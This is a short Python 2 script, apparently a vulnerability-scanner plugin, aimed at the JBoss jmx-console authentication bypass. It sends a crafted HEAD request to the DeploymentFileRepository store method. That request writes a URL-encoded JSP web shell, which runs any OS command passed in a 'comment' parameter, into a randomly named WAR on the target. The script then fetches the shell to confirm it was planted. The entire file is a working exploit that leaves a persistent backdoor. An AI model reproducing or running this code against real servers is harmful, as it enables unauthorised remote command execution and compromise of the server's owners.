#coding:utf-8
#author:wolf@future-sec
import urllib2
import socket
import time
import random
def random_str(len): 
    str1="" 
    for i in range(len): 
        str1+=(random.choice("ABCDEFGH")) 
    return str1
def check(host,port,timeout):
    try:
        socket.setdefaulttimeout(timeout)
        s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s1.connect((host,int(port)))
        shell="""<%@ page import="java.util.*,java.io.*"%> <% %> <HTML><BODY> <FORM METHOD="GET" NAME="comments" ACTION=""> <INPUT TYPE="text" NAME="comment"> <INPUT TYPE="submit" VALUE="Send"> </FORM> <pre> <% if (request.getParameter("comment") != null) { out.println("Command: " + request.getParameter("comment") + "<BR>"); Process p = Runtime.getRuntime().exec(request.getParameter("comment")); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } } %> </pre> </BODY></HTML>"""
        #s1.recv(1024)        
        shellcode=""
        name=random_str(5)
        for v in shell:
            shellcode+=hex(ord(v)).replace("0x","%")
        flag="HEAD /jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodName=store&argType="+\
        "java.lang.String&arg0=%s.war&argType=java.lang.String&arg1=auto700&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3="%(name)+shellcode+\
        "&argType=boolean&arg4=True HTTP/1.0\r\n\r\n"
        s1.send(flag)
        data = s1.recv(512)
        s1.close()
        time.sleep(10)
        url = "http://%s:%d"%(host,int(port))
        webshell_url = "%s/%s/auto700.jsp"%(url,name)
        res = urllib2.urlopen(webshell_url,timeout=timeout)
        if 'comments' in res.read():
            info="Jboss Authentication bypass webshell:%s"%(webshell_url)
            return 'YES|'+info
    except Exception,e:
        pass
    return 'NO'
